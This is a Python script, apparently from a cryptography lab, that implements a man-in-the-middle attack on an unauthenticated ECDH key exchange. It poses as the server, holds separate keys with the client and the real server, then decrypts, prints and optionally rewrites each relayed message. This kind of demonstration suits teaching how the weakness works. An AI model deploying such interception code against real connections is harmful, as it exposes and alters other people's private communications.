import socket
from cbc import AESCipherCBC
from ecdh_p256 import ECDH_P256

class ManInTheMiddle:

    def __init__(self, fake_server_port: int, real_server_ip: str, real_server_port: int):
        self.fake_server_ip = self.__get_ip()
        self.fake_server_port = fake_server_port
        self.real_server_ip = real_server_ip
        self.real_server_port = real_server_port
        self.fake_server_socket = self.__create_fake_server_socket()
        self.client_socket = None
        self.real_server_socket = None

        self.keyExchange_client = ECDH_P256()
        self.keyExchange_server = ECDH_P256()

        self.cipher_client = None
        self.cipher_server = None

    def run(self):
        """Main MITM loop to handle client connection and server relay."""
        try:
            print(f"Fake server listening on {self.fake_server_ip}:{self.fake_server_port}...")
            self.client_socket, client_addr = self.fake_server_socket.accept()
            print(f"Client {client_addr} connected to the fake server.")
            
            # Connect to the real server
            self.__connect_to_real_server()

            # Perform key exchange with client
            self.keyExchange_client.generate_new_keys()
            client_public_key = self.client_socket.recv(1024)
            self.client_socket.sendall(self.keyExchange_client.publicKey.export_key(format='DER'))
            print("Exchanged keys with client.")
            client_shared_key = self.keyExchange_client.get_simetric_key(client_public_key)
            self.cipher_client = AESCipherCBC(client_shared_key)

            # Perform key exchange with real server
            self.keyExchange_server.generate_new_keys()
            self.real_server_socket.sendall(self.keyExchange_server.publicKey.export_key(format='DER'))
            server_public_key = self.real_server_socket.recv(1024)
            print("Exchanged keys with real server.")
            server_shared_key = self.keyExchange_server.get_simetric_key(server_public_key)
            self.cipher_server = AESCipherCBC(server_shared_key)

            # Start relaying messages between client and server
            self.__relay_messages()

        finally:
            self.__close_connections()

    def __get_ip(self):
        return socket.gethostbyname(socket.gethostname())

    def __create_fake_server_socket(self):
        """Create the fake server socket to intercept client connections."""
        fake_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fake_server_socket.bind((self.fake_server_ip, self.fake_server_port))
        fake_server_socket.listen(1)  
        print(f"Fake server created at {self.fake_server_ip}:{self.fake_server_port}")
        return fake_server_socket

    def __connect_to_real_server(self):
        """Connect the MITM to the real server as a client."""
        self.real_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.real_server_socket.connect((self.real_server_ip, self.real_server_port))
        print(f"Connected to real server at {self.real_server_ip}:{self.real_server_port}")

    def __relay_messages(self):
        """Relay messages between client and server, decrypting and encrypting appropriately."""
        try:
            while True:
                print("Waiting for message from client...")
                client_data = self.client_socket.recv(1024)
                if not client_data:
                    print("Client disconnected.")
                    break

                # Decrypt message from client
                decrypted_client_message = self.cipher_client.decrypt(client_data).decode()
                print(f"Intercepted from client: {decrypted_client_message}")

                response = input("Response: ")
                if response == "":
                    response = decrypted_client_message

                # Encrypt message for real server and send
                encrypted_for_server = self.cipher_server.encrypt(response.encode())
                self.real_server_socket.sendall(encrypted_for_server)

                # Receive message from real server
                print("Waiting for message from real server...")
                server_data = self.real_server_socket.recv(1024)
                if not server_data:
                    print("Real server disconnected.")
                    break

                # Decrypt message from real server
                decrypted_server_message = self.cipher_server.decrypt(server_data).decode()
                print(f"Intercepted from server: {decrypted_server_message}")

                response = input("Response: ")
                if response == "":
                    response = decrypted_server_message

                # Encrypt message for client and send
                encrypted_for_client = self.cipher_client.encrypt(response.encode())
                self.client_socket.sendall(encrypted_for_client)

        except Exception as e:
            print(f"Error during message relay: {e}")

    def __close_connections(self):
        """Close all the open connections (client, real server, fake server)."""
        if self.client_socket:
            self.client_socket.close()
        if self.real_server_socket:
            self.real_server_socket.close()
        if self.fake_server_socket:
            self.fake_server_socket.close()
        print("All connections closed.")

if __name__ == "__main__":
    mitm = ManInTheMiddle(fake_server_port=8081, real_server_ip="192.168.1.10", real_server_port=8080)
    mitm.run()
